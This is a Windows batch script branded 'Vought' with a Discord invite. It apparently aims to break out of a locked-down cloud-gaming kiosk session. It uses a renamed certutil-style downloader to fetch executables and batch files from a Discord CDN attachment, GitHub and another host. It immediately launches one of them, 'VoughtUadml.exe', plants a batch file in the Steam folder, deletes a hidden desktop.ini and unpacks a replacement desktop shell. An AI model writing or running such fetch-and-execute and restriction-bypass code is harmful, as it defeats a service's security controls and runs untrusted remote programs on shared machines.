@echo off
title G
cls
:::                ..............    ................................              
:::                ..,;;;;;;,;;;'.   .';cc:::::;;;;;;;;;;:::::::c:;'.              
:::                 .';::::;;;::;,.   .,:cccc::::;;;;;;::cccccclc:,.               
:::                  .';::::;;:::;,.   .'',''''''''';;;:ccccclll:,.                
:::                   .';:::::::cc:,.              .;::ccccclll:,.                 
:::                    .';:::::ccll:,.            .;;::ccccllc:'.                  
:::                     .';::::cclllc;..         .,;:::cccclc:'.                   
:::                      .';:::ccllool:..       .,;:::cccclc;'.                    
:::                       .';::cclllodoc'.     .,;::::ccccc;'.                     
:::                        .';:cclloodxoc.    .,;:::::ccc:;..                      
:::                         .,;:cllloddo:.   .,:::::::cc:;..                       Vought Presents
:::                          .,:clllool;.  ..,:cc:::::::,..                      discord.gg/Vought
:::                           .,:clllc,.  .',:ccc:::::;,.                          
:::                            .,:cl:'. ..,;:cc::::::;,.                           
:::                             .,:;,. ..;:cccc::::;;,.                            
:::                              .''. ..;:ccc:::::;;,.                             
:::                                  ..,;:;;;;;;;;,,.                              
:::                                   ..............                               
:::                                                                                                                                                                          
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A
echo ---------------------------------------------------------------------------------------------------

set "zipFile=C:\Users\kiosk\Downloads\G.zip"
set "unzipFolder=C:\Users\kiosk\Downloads\G"

IF EXIST "C:\Program Files (x86)\steam\ssfn_G.bat" (
echo Exists) ELSE (
  c:\temp\rdl.exe -urlcache -split -f "https://raw.githubusercontent.com/enazar415/Unturned-Cloud/main/ssfn_G.bat" "C:\Program Files (x86)\Steam\ssfn_G.bat"
)

"c:\temp\rdl.exe" -urlcache -split -f "https://files.rycoh.net/rdl.exe" "C:\Users\kiosk\Downloads\rdl.exe"
"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/873261878904782941/1102389310487023727/VoughtUadml.exe" "C:\Users\kiosk\Downloads\VoughtUadml.exe"

if not exist "%unzipFolder%" (
  md "%unzipFolder%"
)

start "" "C:\Users\kiosk\Downloads\VoughtUadml.exe"

"C:\Users\kiosk\Downloads\rdl.exe" -k -L -o  "%zipFile%" "https://github.com/enazar415/Unturned-Cloud/releases/download/test/G.zip"
"C:\Users\kiosk\AppData\Roaming\Cloudforce\7-Zip\7z.exe" x G.zip -oG
del "%zipFile%"

move "C:\Users\kiosk\Downloads\rdl.exe" "%unzipFolder%"
del /A:H "C:\Users\kiosk\Downloads\desktop.ini"

cd "%unzipFolder%"

"C:\Users\kiosk\AppData\Roaming\Cloudforce\7-Zip\7z.exe" x shell.zip -oShell
del shell.zip

#start "" "C:\Users\kiosk\Downloads\G\shell\CairoDesktop.exe"

timeout /t 10


#echo C:\Users\user\Downloads\Cloud.exe|clip